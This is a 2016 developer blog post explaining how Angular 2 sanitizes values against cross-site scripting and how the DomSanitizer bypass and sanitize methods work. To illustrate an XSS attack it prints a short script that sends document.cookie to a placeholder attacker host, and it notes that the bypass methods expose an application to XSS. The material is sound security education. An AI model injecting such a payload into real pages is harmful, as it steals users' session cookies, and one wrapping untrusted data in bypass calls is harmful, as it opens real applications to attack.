---
title: "Angular 2 Security — The DomSanitizer Service"
description: "Cross-site Scripting or XSS is probably the most common website security vulnerability. It enables an attacker to inject client-side script into web pages viewed by other users. Every blog on the…"
date: "2016-11-05T19:12:44.566Z"
categories: 
  - JavaScript
  - Web Development
  - Angularjs
  - Angular2
  - Programming

published: true
canonical_link: https://netbasal.com/angular-2-security-the-domsanitizer-service-2202c83bd90
redirect_from:
  - /angular-2-security-the-domsanitizer-service-2202c83bd90
---

_By: Netanel Basal (Angular Expert) and Yaron Biton, misterBIT.co.il CTO_

![](./asset-1.png)

#### Background:

Cross-site Scripting or XSS is probably the most common website security vulnerability. It enables an attacker to inject client-side script into web pages viewed by other users.

#### **Example of real world attack:**

Every blog on the Internet has a comment’s system that allows users to comment on articles. The comment posted through a regular HTML form:

<Embed src="https://gist.github.com/NetanelBasal/a78b8ffe5081637ccfb7ffc2db53296f.js" aspectRatio={0.357} caption="" />

Now suppose that an attacker sends the following code as a “comment” to the server:

```
<script>
 window.location=’http://attacker/?cookie='+document.cookie
</script>
```

If the website does not protect itself from Cross-site Scripting, this content will be saved to the database and all users visiting the page will redirect to the attacker URL.

A real attacker would, of course, create a much more malicious script, for example, the attacker could record keyboard events and send this information to a server that he owns.

This attack is only one example of XSS attack, but it can be in many forms, like in URL queries, href attributes, CSS and more…

You can read more on XSS in this great [article](http://excess-xss.com/).

#### How Angular 2 protect us from XSS:

> Angular treats all values as untrusted by default. When a value is inserted into the DOM from a template, via property, attribute, style, class binding, or interpolation, Angular sanitizes and escapes untrusted values.

**Sanitization** modifies the input, turning it into a value that is safe to insert into the DOM. In Angular sanitization depends on context, a value that is harmless in CSS is potentially dangerous in a URL. you can read about the different contexts [here](https://angular.io/docs/ts/latest/guide/security.html).

For example when we try to do this:

<Embed src="https://gist.github.com/NetanelBasal/5a9aef014d9c9076693b2dec7ec955b8.js" aspectRatio={0.357} caption="" />

Behind the scenes, Angular will sanitize the HTML input and escape the unsafe code, so in this case, the script will not run, only display on the screen as text.

Another example, if you will try to bind the _src_ property of an Iframe (or a video):

<Embed src="https://gist.github.com/NetanelBasal/7f9e33c85bc51506ec4dc312091d5db5.js" aspectRatio={0.357} caption="" />

You will get this error:

_“unsafe value used in a resource URL context.”_

Angular throwing this error because the <iframe src> attribute is a resource URL security context, because an untrusted source can, for example, smuggle in file downloads that unsuspecting users could execute.

#### Bypass Angular protection:

What if we need to Bypass Angular protection and trust the given value in our particular case?

In this case, we can use the **DomSanitizer** service. Let’s see how we can use this service in the above examples.

<Embed src="https://gist.github.com/NetanelBasal/cddb6581118870af3d33e72fa124896d.js" aspectRatio={0.357} caption="" />

We are injecting the DomSanitizer service and execute the bypassSecurityTrustHtml method, because we are dealing with html context to Bypass security and trust the given value to be safe HTML.

Next, let’s see how we can use the Iframe src:

<Embed src="https://gist.github.com/NetanelBasal/fa2e460e869d7d22553dddc7beaf183a.js" aspectRatio={0.357} caption="" />

We are injecting the DomSanitizer service and execute the bypassSecurityTrustResourceUrl method to Bypass security and trust the given value to be a safe style URL.

**Note**: calling these methods with untrusted user data exposes your application to XSS security risks!

#### How to Sanitizes a value manually:

Sometimes you need to sanitizes a value manually, maybe you need to work with third-party APIs that contain unsafe methods. You can use the sanitize method. The sanitize method takes the context (as enum) that can be one of:

-   SecurityContext.NONE
-   SecurityContext.HTML
-   SecurityContext.STYLE
-   SecurityContext.SCRIPT
-   SecurityContext.URL
-   SecurityContext.RESOURCE\_URL

and the value to sanitize.

<Embed src="https://gist.github.com/NetanelBasal/703a57abce178e06ad6b29b150f981b1.js" aspectRatio={0.357} caption="" />

That’s all.

_☞_ **_Please tap or click “︎_**❤” _to help to promote this piece to others._
